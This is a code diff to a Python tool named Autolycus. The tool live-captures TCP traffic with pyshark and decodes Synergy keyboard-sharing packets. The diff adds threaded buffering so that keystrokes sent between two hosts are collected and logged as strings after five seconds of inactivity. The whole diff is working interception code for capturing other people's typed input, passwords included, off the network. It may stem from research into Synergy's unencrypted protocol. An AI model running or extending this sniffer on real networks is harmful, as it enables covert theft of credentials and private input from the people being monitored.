@@ -2,12 +2,15 @@ import pyshark
 import argparse
 import sys
 import logging
+import time
+from threading import Thread
+from collections import defaultdict
 from fabulous import text
 from colorlog import ColoredFormatter
 
 
 class Autolycus(object):
-    __slots__ = ["interface", "capture", "log", "active_connections"]
+    __slots__ = ["interface", "capture", "log", "active_connections", "temp_keystrokes"]
 
     # packet type constants
     PACKET = {
@@ -31,11 +34,15 @@ class Autolycus(object):
     DATA = 7
     CONN = 8
 
+    # other constants
+    KEYSTROKE_WAIT_TIME = 5
+
     def __init__(self, interface):
         self.interface = interface
         self.capture = capture = pyshark.LiveCapture(interface=interface, bpf_filter="tcp")
         self.log = self.setup_logger()
         self.active_connections = set()
+        self.temp_keystrokes = defaultdict(list)
 
     def start(self):
         self.print_banner()
@@ -101,7 +108,23 @@ class Autolycus(object):
             self.log.log(self.SETUP, f"\t{packet.synergy._get_field_repr(field)}")
 
     def handle_keystroke(self, packet):
-        self.log.log(self.DATA, f"({packet.ip.src} -> {packet.ip.dst}) sending keystroke: {chr(int(packet.synergy.keypressed_keyid))}")
+        if len(self.temp_keystrokes[hash(packet.ip.src + packet.ip.dst) & ((1 << 32) - 1)]) == 0:
+            self.log.log(self.DATA, f"({packet.ip.src} -> {packet.ip.dst}) sending keystrokes, collecting until {self.KEYSTROKE_WAIT_TIME} seconds of inactivity...")
+            Thread(target=self.keystroke_listener, args=(packet.ip.src, packet.ip.dst)).start()
+        self.temp_keystrokes[hash(packet.ip.src + packet.ip.dst) & ((1 << 32) - 1)].append(chr(int(packet.synergy.keypressed_keyid)))
+    
+    def keystroke_listener(self, src, dst):
+        wait = self.KEYSTROKE_WAIT_TIME
+        start_size = len(self.temp_keystrokes[hash(src + dst) & ((1 << 32) - 1)])
+        while wait > 0:
+            if len(self.temp_keystrokes[hash(src + dst) & ((1 << 32) - 1)]) != start_size:
+                wait = self.KEYSTROKE_WAIT_TIME
+                start_size = len(self.temp_keystrokes[hash(src + dst) & ((1 << 32) - 1)])
+            else:
+                wait -= 1
+            time.sleep(1)
+        self.log.log(self.DATA, f"({src} -> {dst}) collected keystrokes: {' '.join(self.temp_keystrokes[hash(src + dst) & ((1 << 32) - 1)])}")
+        self.temp_keystrokes[hash(src + dst) & ((1 << 32) - 1)].clear()
 
     def print_banner(self):
         BANNER_WIDTH = 115
